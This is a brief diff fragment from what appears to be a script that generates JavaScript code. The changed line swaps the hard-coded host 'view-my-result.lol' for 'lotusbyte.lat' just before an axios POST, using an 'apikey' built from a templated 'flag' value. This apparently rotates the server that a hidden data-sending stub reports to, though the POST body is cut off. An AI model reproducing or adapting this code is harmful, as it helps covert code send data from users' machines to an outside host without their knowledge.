@@ -425,7 +425,7 @@ exit 0
 
       script = `
 	const axios = require('axios');
-const host = "view-my-result.lol";
+const host = "lotusbyte.lat";
 const apikey = "3aeb34a3${flag}";
 axios
   .post(
